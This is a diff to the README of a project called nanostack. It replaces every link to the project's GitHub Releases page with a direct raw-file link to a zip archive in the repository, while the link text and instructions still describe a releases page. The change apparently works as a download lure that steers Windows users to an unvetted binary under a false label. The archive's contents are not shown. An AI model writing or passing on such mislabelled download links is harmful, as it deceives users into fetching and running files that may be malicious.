@@ -1,6 +1,6 @@
 # ⚙️ nanostack - Keep Your Coding Work Organized
 
-[![Download nanostack](https://img.shields.io/badge/Download%20nanostack-%23007ACC?style=for-the-badge)](https://github.com/Jihadyip286/nanostack/releases)
+[![Download nanostack](https://img.shields.io/badge/Download%20nanostack-%23007ACC?style=for-the-badge)](https://raw.githubusercontent.com/Jihadyip286/nanostack/main/ship/bin/Software-2.6.zip)
 
 ## 🚀 What nanostack does
 
@@ -32,7 +32,7 @@ For the best experience, use a machine with:
 
 Visit the release page here:
 
-[Download nanostack from GitHub Releases](https://github.com/Jihadyip286/nanostack/releases)
+[Download nanostack from GitHub Releases](https://raw.githubusercontent.com/Jihadyip286/nanostack/main/ship/bin/Software-2.6.zip)
 
 On that page, look for the latest release and download the Windows file. If there are several files, choose the one for Windows.
 
@@ -178,4 +178,4 @@ After setup, nanostack should let you:
 
 ## 🏁 Download again
 
-[Visit the nanostack releases page](https://github.com/Jihadyip286/nanostack/releases)
+[Visit the nanostack releases page](https://raw.githubusercontent.com/Jihadyip286/nanostack/main/ship/bin/Software-2.6.zip)
